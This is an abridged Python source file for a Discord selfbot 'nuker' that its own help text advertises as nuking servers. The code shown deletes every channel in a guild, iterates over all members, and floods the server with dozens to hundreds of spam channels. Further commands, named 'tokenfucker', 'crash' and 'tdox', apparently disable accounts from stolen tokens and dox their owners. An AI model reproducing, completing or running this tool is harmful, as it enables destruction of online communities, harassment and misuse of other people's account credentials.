...
Tro = commands.Bot(command_prefix=prefix, self_bot=True)
Tro.remove_command('help')
...
async def help(ctx):
    ...
    embed = discord.Embed(title=" Tro Nuker by 1tro Jr #SKIDSK ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/769631081795551262/771471409813389362/image0-82.gif")
    embed.add_field(name=prefix+"**tro**", value="`Nukes the server`.\n", inline=False)
...
async def ercy(ctx):
    ...
    for users in ctx.guild.members:
        try:
            ...
            print(f"{Fore.RED}Tro Block ")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.RED}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'Tro Block {i}')
            await ctx.guild.create_voice_channel(name=f'Tro Block {i}')
            await ctx.guild.create_category(name=f'Tro Block {i}')
...
async def channels(ctx):
  ...
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'TRO HOED YOU ')
    print(f"{Fore.RED}Added {channel.name}")
...
async def stream(ctx, *, message): 
    ...
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/TroW", 
    )
    await Tro.change_presence(activity=stream)

@Tro.command(name='groupleaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def group(ctx): 
    await ctx.message.delete()
    for channel in Tro.private_channels:
...
@Tro.command(aliases=['pfp', 'avatar'])
...
@Tro.command(aliases=['tokenfucker', 'disable', 'crash']) 
...
@Tro.command(aliases=['tokinfo', 'tdox'])
